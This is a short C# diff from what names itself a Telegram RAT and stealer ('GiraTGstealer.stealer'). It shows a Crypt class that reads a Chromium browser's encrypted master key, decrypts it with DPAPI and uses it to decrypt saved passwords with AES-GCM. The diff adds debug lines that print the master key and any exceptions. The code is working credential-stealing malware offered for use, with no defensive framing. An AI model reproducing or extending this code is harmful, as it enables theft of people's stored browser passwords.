@@ -3,7 +3,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 
-namespace TelegramRAT
+namespace GiraTGstealer.stealer
 {
     internal class Crypt
     {
@@ -32,6 +32,7 @@ namespace TelegramRAT
                 // Get master key
                 masterKey = File.ReadAllText(masterKeyPath);
                 masterKey = SimpleJSON.JSON.Parse(masterKey)["os_crypt"]["encrypted_key"];
+                Console.WriteLine("Master key: " + masterKey);
                 // Decrypt master key
                 byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(masterKey)).Remove(0, 5));
                 byte[] masterKeyBytes = DPAPI.Decrypt(keyBytes, null, out string _);
@@ -44,7 +45,9 @@ namespace TelegramRAT
                     string decryptedPassword = Encoding.Default.GetString(Sodium.SecretAeadAes.Decrypt(payload, iv, masterKeyBytes));
                     return decryptedPassword;
                 }
-                catch { return "failed (AES-GCM)"; }
+                catch (Exception ex){ 
+                    Console.WriteLine(ex.ToString());
+                    return "failed (AES-GCM)"; }
 
                 // return decryptedPassword;
             }
